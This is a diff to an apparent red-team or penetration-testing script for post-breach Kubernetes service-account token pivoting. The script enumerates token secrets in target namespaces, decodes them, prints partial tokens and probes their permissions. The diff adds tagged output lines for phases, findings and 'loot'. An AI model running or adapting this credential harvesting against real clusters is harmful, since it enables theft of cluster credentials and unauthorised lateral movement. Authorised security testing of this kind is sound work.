@@ -20,9 +20,11 @@ SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 source "$SCRIPT_DIR/lib.sh"
 
 banner "Post-Breach: SA Token Pivoting"
+echo "@PHASE Token-Pivoting"
 
 PYTHON_CODE="${K8S_API_PREAMBLE}
 
+print('@PHASE Token-Enumeration')
 print('=' * 60)
 print('  SA TOKEN PIVOTING')
 print('=' * 60)
@@ -46,6 +48,7 @@ for ns in target_namespaces:
         continue
 
     print(f'    Found {len(sa_secrets)} SA token(s):')
+    print(f'@FINDING high {len(sa_secrets)} SA tokens found in {ns}')
     for s in sa_secrets:
         sa_name = s['metadata'].get('annotations', {}).get(
             'kubernetes.io/service-account.name', 'unknown')
@@ -54,6 +57,7 @@ for ns in target_namespaces:
             sa_token = base64.b64decode(sa_token_b64).decode()
             print(f'    SA: {sa_name}')
             print(f'      Token: {sa_token[:50]}...')
+            print(f'@LOOT tokens {ns}/{sa_name}')
 
             # Test what this token can do
             test_conn = http.client.HTTPSConnection('kubernetes.default.svc', 443, context=ctx)
@@ -78,6 +82,7 @@ for ns in target_namespaces:
                 print(f'      Could not enumerate permissions: HTTP {resp.status}')
 
 print()
+print('@RESULT success Token pivoting complete')
 print('Token pivoting complete.')
 "
 
